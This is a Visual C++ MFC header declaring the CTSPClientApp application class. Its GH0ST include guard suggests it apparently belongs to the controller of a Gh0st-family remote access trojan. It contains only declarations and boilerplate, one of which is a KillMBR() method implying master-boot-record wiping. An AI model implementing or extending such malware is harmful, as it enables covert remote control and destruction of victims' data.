// TSPClient.h : main header file for the TSPClient application
//

#ifndef AFX_GH0ST_H__C0496689_B41C_45DE_9F46_75A916C86D38__INCLUDED_
#define AFX_GH0ST_H__C0496689_B41C_45DE_9F46_75A916C86D38__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#ifndef __AFXWIN_H__
	#error include 'stdafx.h' before including this file for PCH
#endif

#include "resource.h"       // main symbols
/////////////////////////////////////////////////////////////////////////////
// CTSPClientApp:
// See TSPClient.cpp for the implementation of this class
//
#include "IniFile.h"
class CTSPClientApp : public CWinApp
{
public:
	CIniFile	m_IniFile;
	int KillMBR();
	// ClientContext地址为主键
	BOOL m_bIsQQwryExist;
	BOOL m_bIsDisablePopTips;
	BOOL m_filterUnknown;
	BOOL m_autoSelectVisible;
//	CView*		m_pConnectView; // 主连接视图
	
	CTSPClientApp();

// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CTSPClientApp)
	public:
	virtual BOOL InitInstance();
	//}}AFX_VIRTUAL

// Implementation
	//{{AFX_MSG(CTSPClientApp)
	afx_msg void OnAppAbout();
		// NOTE - the ClassWizard will add and remove member functions here.
		//    DO NOT EDIT what you see in these blocks of generated code !
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
	virtual int ExitInstance();
};


/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_GH0ST_H__C0496689_B41C_45DE_9F46_75A916C86D38__INCLUDED_)
